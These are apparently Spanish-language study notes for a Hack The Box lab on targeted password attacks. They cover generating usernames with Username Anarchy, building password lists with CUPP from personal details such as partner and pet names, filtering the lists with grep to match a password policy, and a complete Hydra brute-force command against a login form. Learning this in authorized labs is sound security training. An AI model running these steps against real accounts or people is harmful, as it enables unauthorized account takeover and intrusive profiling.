
## 1. ¿Por qué utilizar listas de palabras personalizadas?

Las wordlists genéricas, como `rockyou.txt` o las de SecLists, contienen grandes cantidades de nombres de usuario y contraseñas potenciales. Sin embargo, pueden resultar poco eficientes cuando el objetivo sigue convenciones específicas.

Las listas personalizadas permiten generar candidatos a partir de información relacionada con el objetivo y aplicar las reglas de su entorno.

**Ventajas:**

- Reducen la cantidad de combinaciones irrelevantes.
    
- Permiten adaptar los nombres de usuario a convenciones habituales.
    
- Generan contraseñas potenciales a partir de información recopilada mediante OSINT.
    
- Permiten filtrar las contraseñas según las políticas conocidas de la organización.

## 2. Username Anarchy

**Username Anarchy** genera posibles nombres de usuario a partir del nombre y apellido de una persona.

Por ejemplo, para `Jane Smith`, puede generar variaciones como:

- `janesmith`
    
- `jane.smith`
    
- `j.smith`
    
- `smithjane`
    
- `smith.jane`
    
- `js`
    
- `jane`
    

También contempla variaciones de iniciales, mayúsculas y diferentes convenciones de nombres de usuario.

### Instalación

```
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```

### Consultar los formatos disponibles

```
./username-anarchy -l
```

### Generar una wordlist personalizada

```
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

Esto guarda las combinaciones generadas en `jane_smith_usernames.txt`.

### Comprobar el resultado

```
cat jane_smith_usernames.txt
```

**Idea clave:** Username Anarchy automatiza la generación de nombres de usuario que, de otro modo, tendríamos que construir manualmente.

## 3. CUPP (Common User Passwords Profiler)

**CUPP** genera listas de contraseñas personalizadas a partir de información conocida sobre una persona.

Los datos pueden incluir:

- Nombre y apellido.
    
- Apodo.
    
- Fecha de nacimiento.
    
- Nombre y fecha de nacimiento de la pareja.
    
- Nombres de hijos y mascotas.
    
- Empresa.
    
- Palabras clave relacionadas con intereses personales.
    

En un laboratorio autorizado, esta información puede utilizarse para generar candidatos más relevantes que los de una wordlist genérica.

### Instalación

```
sudo apt install cupp -y
```

### Ejecutar CUPP en modo interactivo

```
cupp -i
```

CUPP solicitará los datos disponibles y preguntará si se quieren incorporar palabras clave, caracteres especiales, números y sustituciones de tipo _leet_.

No es necesario conocer todos los datos: puedes dejar los campos desconocidos vacíos.

### Ejemplo de datos

|Campo|Valor de ejemplo|
|---|---|
|Nombre|Jane|
|Apellido|Smith|
|Apodo|Janey|
|Fecha de nacimiento|11121990|
|Pareja|Jim|
|Apodo de la pareja|Jimbo|
|Mascota|Spot|
|Empresa|AHI|
|Palabras clave|hacker, blue|

Al finalizar, CUPP genera una wordlist. En el ejemplo del módulo, el archivo resultante es:

```
jane.txt
```

### Resultado

CUPP combina la información introducida para generar posibles variaciones de contraseñas. En el ejemplo del módulo, produce unas 46.790 candidatas.

**Idea clave:** Username Anarchy genera posibles usuarios; CUPP genera posibles contraseñas.

## 4. Filtrar una wordlist según una política de contraseñas

Una vez generada la wordlist, podemos reducirla aplicando los requisitos de contraseña de la organización.

### Política del ejemplo

Las contraseñas deben cumplir todos estos requisitos:

- Longitud mínima de 6 caracteres.
    
- Al menos una letra mayúscula.
    
- Al menos una letra minúscula.
    
- Al menos un número.
    
- Al menos dos caracteres especiales del conjunto `!@#$%^&*`.
    

### Comando de filtrado

```
grep -E '^.{6,}$' jane.txt | \
grep -E '[A-Z]' | \
grep -E '[a-z]' | \
grep -E '[0-9]' | \
grep -E '([!@#$%^&*].*){2,}' \
> jane-filtered.txt
```

### Explicación de las expresiones regulares

|Expresión|Función|
|---|---|
|`^.{6,}$`|Exige una longitud mínima de 6 caracteres.|
|`[A-Z]`|Busca al menos una letra mayúscula.|
|`[a-z]`|Busca al menos una letra minúscula.|
|`[0-9]`|Busca al menos un número.|
|`([!@#$%^&*].*){2,}`|Comprueba que haya al menos dos caracteres especiales del conjunto indicado.|
|`>`|Guarda el resultado en el archivo especificado.|

Cada `grep` recibe la salida del anterior, por lo que una contraseña debe superar todos los filtros para aparecer en el resultado.

La wordlist filtrada se guarda en:

```
jane-filtered.txt
```

Según el ejemplo del módulo, el filtrado reduce aproximadamente 46.000 contraseñas a unas 7.900 candidatas.

### Comprobar el tamaño de las wordlists

```
wc -l jane.txt jane-filtered.txt
```

Esto permite comparar el número de líneas de la lista original y la filtrada.

## 5. Utilizar las wordlists con Hydra

Una vez generadas las listas de usuarios y contraseñas, podemos utilizarlas con Hydra contra el formulario de login del objetivo.

### Comando

```
hydra -L jane_smith_usernames.txt \
-P jane-filtered.txt \
IP -s PORT -f \
http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

Sustituye:

- `IP`: dirección del objetivo de HTB.
    
- `PORT`: puerto del servicio web.
    

### Parámetros principales

|Opción|Función|
|---|---|
|`-L jane_smith_usernames.txt`|Utiliza una lista de nombres de usuario.|
|`-P jane-filtered.txt`|Utiliza una lista de contraseñas.|
|`-s PORT`|Especifica el puerto del servicio.|
|`-f`|Detiene el ataque contra el objetivo cuando encuentra una pareja válida.|
|`http-post-form`|Selecciona el módulo para formularios HTTP POST.|

La cadena del formulario utiliza:

```
/:username=^USER^&password=^PASS^:Invalid credentials
```

- `/`: ruta del formulario.
    
- `username=^USER^`: campo del usuario.
    
- `password=^PASS^`: campo de la contraseña.
    
- `Invalid credentials`: texto utilizado para identificar los intentos fallidos.
    

**Importante:** la cadena debe coincidir con los nombres de los campos y el mensaje de error reales del formulario. Si el comportamiento de la aplicación es distinto, habrá que adaptar la condición.

Cuando Hydra encuentre credenciales válidas, compruébalas iniciando sesión en el laboratorio para recuperar la flag.

## 6. Flujo de trabajo para el examen

```
1. Recopilar información del objetivo
              |
              v
2. Generar nombres de usuario
   Username Anarchy
              |
              v
3. Generar contraseñas
   CUPP
              |
              v
4. Filtrar las contraseñas
   grep + expresiones regulares
              |
              v
5. Ejecutar Hydra
   Wordlist de usuarios + wordlist de contraseñas
              |
              v
6. Validar las credenciales
   Iniciar sesión y recuperar la flag
```

### Comandos esenciales

```
# Instalar Username Anarchy
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

# Generar nombres de usuario
./username-anarchy Jane Smith > jane_smith_usernames.txt

# Instalar CUPP
sudo apt install cupp -y

# Generar contraseñas personalizadas
cupp -i

# Filtrar contraseñas según la política
grep -E '^.{6,}$' jane.txt | \
grep -E '[A-Z]' | \
grep -E '[a-z]' | \
grep -E '[0-9]' | \
grep -E '([!@#$%^&*].*){2,}' \
> jane-filtered.txt

# Comparar tamaños
wc -l jane.txt jane-filtered.txt

# Atacar el formulario en el laboratorio
hydra -L jane_smith_usernames.txt \
-P jane-filtered.txt \
IP -s PORT -f \
http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

## 7. Conceptos que debes recordar

- **Username Anarchy:** genera combinaciones de nombres de usuario a partir del nombre y apellido.
    
- **CUPP:** genera contraseñas potenciales a partir de información personalizada.
    
- **OSINT:** permite recopilar información relevante para crear wordlists específicas.
    
- **grep:** filtra las contraseñas utilizando expresiones regulares.
    
- **Hydra:** prueba las combinaciones de usuarios y contraseñas contra el servicio.
    
- **Wordlists personalizadas:** pueden reducir el espacio de búsqueda cuando se conocen las convenciones de nombres de usuario y la política de contraseñas.
    

**Conclusión:** un ataque dirigido combina información específica del objetivo, generación de candidatos, filtrado según los requisitos conocidos y validación mediante Hydra.
